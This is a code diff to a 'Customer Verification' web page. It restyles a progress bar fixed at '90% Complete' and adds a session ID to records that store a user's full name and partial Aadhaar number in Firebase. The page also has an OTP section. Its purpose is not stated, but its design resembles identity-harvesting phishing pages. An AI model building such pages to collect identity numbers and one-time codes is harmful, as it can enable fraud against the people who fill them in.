@@ -62,22 +62,27 @@
     .headline .headline-text {
       margin-left: 30px;
     }
+
+    /* Updated Progress Bar Style */
     .progress-bar-container {
       width: 100%;
       max-width: 480px;
-      height: 10px;
+      height: 12px;
       background-color: #e0e0e0;
-      border-radius: 5px;
-      margin: 10px 0;
+      border-radius: 10px;
+      margin: 15px 0;
       position: relative;
     }
+
     .progress-bar {
       height: 100%;
       background-color: #4caf50;
-      border-radius: 5px;
+      border-radius: 10px;
       width: 90%;
+      transition: width 0.5s ease-in-out;
       position: relative;
     }
+
     .progress-text {
       position: absolute;
       width: 100%;
@@ -87,6 +92,7 @@
       transform: translateY(-50%);
       color: #ffffff;
     }
+
     .otp-section {
       width: 100%;
       max-width: 480px;
@@ -207,10 +213,10 @@
   <div class="headline-text">Customer Verification</div>
 </div>
 
-<!-- Progress Bar -->
+<!-- Updated Progress Bar -->
 <div class="progress-bar-container">
-  <div class="progress-bar">
-    <div class="progress-text">90% Complete</div>
+  <div class="progress-bar" id="progressBar">
+    <div class="progress-text" id="progressText">90% Complete</div>
   </div>
 </div>
 
@@ -258,6 +264,15 @@
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
+  // Generate a session ID
+  function generateSessionId() {
+    return 'session_' + Math.random().toString(36).substr(2, 9);
+  }
+
+  // Store session ID
+  let sessionId = generateSessionId();
+  console.log("Session ID:", sessionId); // For debugging
+
   window.allowOnlyDigits = function(input) {
     input.value = input.value.replace(/\D/g, '').slice(0, 4);
   }
@@ -277,6 +292,7 @@
       await addDoc(collection(db, "aadhaar_verifications"), {
         fullName: fullName,
         aadhaarLast4: aadhaarLast4,
+        sessionId: sessionId, // Save sessionId with the data
         timestamp: serverTimestamp()
       });
 
